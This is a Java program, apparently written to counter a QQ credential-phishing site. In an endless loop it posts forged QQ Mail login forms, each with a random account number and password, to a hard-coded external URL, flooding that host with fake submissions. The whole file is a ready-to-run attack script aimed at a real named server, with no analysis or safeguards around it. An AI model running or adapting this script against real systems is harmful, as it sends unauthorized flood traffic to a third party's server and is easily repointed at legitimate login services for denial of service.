package com.sky.exercise;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ThreadLocalRandom;

import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.HttpVersion;
import org.apache.http.NameValuePair;

public class AttackQQSteal {

	public static void main(String[] args) {      		
		AttackQQSteal instance = new AttackQQSteal();		
		while(true){
			instance.start();
		}
	}
	
	public void start(){
		HttpClient client = new DefaultHttpClient();
		HttpPost httpPost = new HttpPost("http://mou.uuquan.com.cn/email.asp?237679e/102.html");
		httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
		List<NameValuePair> data = new ArrayList<NameValuePair>();
        data.add(new BasicNameValuePair("aid", "522005705"));
        data.add(new BasicNameValuePair("daid", "4"));
        data.add(new BasicNameValuePair("from_ui", "1"));
        data.add(new BasicNameValuePair("ptredirect", "1"));
        data.add(new BasicNameValuePair("h", "1"));
        data.add(new BasicNameValuePair("wording", "快速登录"));
        data.add(new BasicNameValuePair("css", "https://mail.qq.com/zh_CN/htmledition/style/fast_login148203.css"));
        data.add(new BasicNameValuePair("mibao_css", "m_ptmail"));
        data.add(new BasicNameValuePair("u_domain", "@qq.com"));
        ThreadLocalRandom r = ThreadLocalRandom.current();
        StringBuffer qq = new StringBuffer();
        while(true){
        	int m = r.nextInt(9);
        	if(m != 0){
        		qq.append(m);
        		break;
        	}
        }
        for(int i=0; i<8; i++){
        	qq.append(r.nextInt(9));
        }
        
        data.add(new BasicNameValuePair("uin", qq.toString()));
        data.add(new BasicNameValuePair("u", qq.toString()+"@qq.com"));
        String password = randomString(r.nextInt(10, 20));
        data.add(new BasicNameValuePair("p", password));  
        data.add(new BasicNameValuePair("verifycode", ""));
        data.add(new BasicNameValuePair("btlogin", "登录"));
        
        try {
            httpPost.setEntity(new UrlEncodedFormEntity(data, "UTF-8"));
            HttpResponse response = client.execute(httpPost);
            int status = response.getStatusLine().getStatusCode();
            if (status == 200) {
            	System.out.println("Success with qq="+qq+"  pw="+password);
            } else {
            	System.out.println("Failed with status code = "+status);
            }
	    } catch (Exception e) {
	    	System.out.println("Exception: "+e);
	    }finally{
	    	client.getConnectionManager().shutdown();
	    }
	}
	
	public String randomString(int length) {  
	    StringBuilder builder = new StringBuilder(length);  
	    for (int i = 0; i < length; i++) {  
	        builder.append((char) (ThreadLocalRandom.current().nextInt(33, 128)));  
	    }  
	    return builder.toString();  
	}

}
